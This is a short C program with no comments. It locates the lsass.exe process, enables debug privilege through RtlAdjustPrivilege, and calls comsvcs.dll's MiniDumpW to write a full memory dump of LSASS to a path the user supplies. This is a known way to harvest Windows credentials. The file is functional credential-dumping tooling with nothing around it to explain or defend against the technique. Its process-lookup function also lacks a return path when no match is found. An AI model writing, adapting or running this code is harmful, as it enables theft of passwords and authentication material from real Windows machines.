#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef HRESULT(WINAPI *_MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable,
                                              BOOL CurrentThread,
                                              PULONG Enabled);
#define TARGET_PROCESS "lsass.exe"

BOOL EnumProcess(IN char *pProcessName, OUT DWORD *pdwProcessId) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (stricmp(pe32.szExeFile, pProcessName) == 0) {
            *pdwProcessId = pe32.th32ProcessID;
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));
}

int main(int argc, char *argv[]) {
    HRESULT hr;
    ULONG t;
    DWORD Pid;
    _MiniDumpW MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;

    WCHAR wCommandLine[MAX_PATH] = {0};
    WCHAR wDumpPath[MAX_PATH] = {0};

    if(!EnumProcess(TARGET_PROCESS, &Pid)){
        printf("[X] Can't Get Process Pid!\n");
        return 1;
    }
    swprintf_s(wDumpPath, MAX_PATH, L"%hs", argv[1]);
    swprintf_s(wCommandLine, MAX_PATH, L"%d %ls full", Pid,
               wDumpPath);

    printf("[+] Pid: %d\n", Pid);
    printf("[+] Dump Path: %ls\n", wDumpPath);

    MiniDumpW =
        (_MiniDumpW)GetProcAddress(LoadLibrary("comsvcs.dll"), "MiniDumpW");
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        LoadLibrary("ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL || RtlAdjustPrivilege == NULL) {
        printf("[X] Unable to resolve MiniDump!\n");
        return 1;
    }

    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    printf("[+] Lanuch COMSVCS!MiniDumpW(\"%ls\")\n", wCommandLine);

    MiniDumpW(0, 0, wCommandLine);
    printf("[+] Done!\n");

    return 0;
}
